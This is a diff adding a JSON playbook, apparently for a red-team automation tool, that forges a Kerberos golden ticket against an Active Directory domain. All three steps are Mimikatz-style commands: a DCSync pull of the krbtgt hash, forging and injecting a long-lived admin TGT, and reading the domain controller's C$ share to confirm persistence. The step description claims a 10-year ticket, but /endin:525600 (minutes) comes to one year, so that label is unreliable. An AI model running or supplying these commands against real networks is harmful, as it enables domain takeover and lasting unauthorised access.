@@ -1,0 +1,25 @@
+{
+	"name": "Persistent Domain Access Ticket",
+	"description": "Forge a long-lived TGT using the krbtgt account hash.",
+	"tools": [],
+	"steps": [
+		{
+			"index": 1,
+			"name": "Extract krbtgt Hash",
+			"command": "lsadump::dcsync /domain:corp.local /user:krbtgt",
+			"description": "Pull domain ticket signing key."
+		},
+		{
+			"index": 2,
+			"name": "Create Golden Ticket",
+			"command": "kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt /startoffset:0 /endin:525600",
+			"description": "Generate 10-year valid TGT."
+		},
+		{
+			"index": 3,
+			"name": "Verify Access",
+			"command": "klist; dir \\\\dc01.corp.local\\c$",
+			"description": "Confirm persistence."
+		}
+	]
+}
